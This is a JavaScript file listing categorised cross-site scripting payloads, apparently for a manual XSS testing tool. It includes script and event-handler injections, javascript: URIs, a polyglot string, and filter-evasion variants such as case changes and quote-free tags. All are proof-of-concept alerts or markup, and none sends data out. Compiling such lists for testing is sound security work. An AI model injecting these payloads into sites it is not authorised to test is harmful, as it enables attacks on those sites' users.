// List of common XSS payloads
// Categorized for potential future filtering, though detection is manual for now.
const xssPayloads = [
    // Basic Alert Payloads
    { name: "Basic Alert", payload: "<script>alert('XSS')</script>", category: "Reflected" },
    { name: "Image OnError Alert", payload: "<img src=x onerror=alert('XSS')>", category: "Reflected" },
    { name: "SVG OnLoad Alert", payload: "<svg onload=alert('XSS')>", category: "Reflected" },
    { name: "Body OnLoad Alert", payload: "<body onload=alert('XSS')>", category: "Reflected" }, // Less common via injection

    // DOM Interaction Payloads (Often used for DOM XSS)
    { name: "Location Hash Change", payload: "<script>location.hash='XSS'</script>", category: "DOM" },
    { name: "Simple DOM Write", payload: "<script>document.write('XSS')</script>", category: "DOM" }, // Might break page
    { name: "Iframe Src JS", payload: "<iframe src=\"javascript:alert('XSS')\"></iframe>", category: "DOM" },

    // HTML Injection / Content Spoofing
    { name: "Inject H1 Tag", payload: "<h1>XSS</h1>", category: "Reflected" },
    { name: "Inject Link", payload: "<a href='javascript:alert(\"XSS\")'>Click Me</a>", category: "Reflected" },

    // Polyglot Payloads (Attempt to work in different contexts)
    { name: "Basic Polyglot", payload: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>", category: "Polyglot" },
    { name: "OnError/Alert Polyglot", payload: "\"><img src=x onerror=alert(1)>", category: "Polyglot" },
    { name: "SVG/OnError Polyglot", payload: "<svg/onload=alert(1)>", category: "Polyglot" },

    // Filter Evasion Attempts (Examples)
    { name: "Case Variation", payload: "<ScRiPt>alert('XSS')</ScRiPt>", category: "Reflected" },
    { name: "No Quotes/Spaces (img)", payload: "<img/src/onerror=alert(1)>", category: "Reflected" },
    { name: "Event Handler (no script tags)", payload: "<div onmouseover=\"alert('XSS')\">Hover me</div>", category: "Reflected" }, // Needs user interaction

    // URL Fragment Payloads (for DOM XSS testing)
    { name: "Fragment Basic Alert", payload: "#<script>alert('XSS_Fragment')</script>", category: "DOM" }, // Needs specific handling in app.js
    { name: "Fragment Img OnError", payload: "#<img src=x onerror=alert('XSS_Fragment')>", category: "DOM" }, // Needs specific handling

];

// Make the payloads available globally or export if using modules (global for simplicity here)
window.xssPayloads = xssPayloads;
